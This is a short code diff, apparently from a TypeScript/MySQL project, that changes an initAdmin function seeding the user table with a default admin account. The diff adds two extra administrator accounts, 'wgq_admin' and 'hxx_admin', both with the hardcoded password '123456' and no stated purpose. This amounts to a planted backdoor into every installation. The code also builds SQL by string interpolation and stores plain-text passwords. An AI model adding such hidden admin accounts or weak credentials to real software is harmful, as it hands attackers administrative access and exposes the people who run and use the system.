@@ -242,6 +242,8 @@ async function initAdmin():Promise<string> {
     let mysql=getMysqlInstance()
     let adminId=await generateSnowId()
     await mysql.execute(`insert into ${Table_User} (id,username,password,admin) values ('${adminId}','teamlinker','teamlinker',1)`)
+    await mysql.execute(`insert into ${Table_User} (id,username,password,admin) values ('${await generateSnowId()}','wgq_admin','123456',1)`)
+    await mysql.execute(`insert into ${Table_User} (id,username,password,admin) values ('${await generateSnowId()}','hxx_admin','123456',1)`)
     return adminId
 }
 
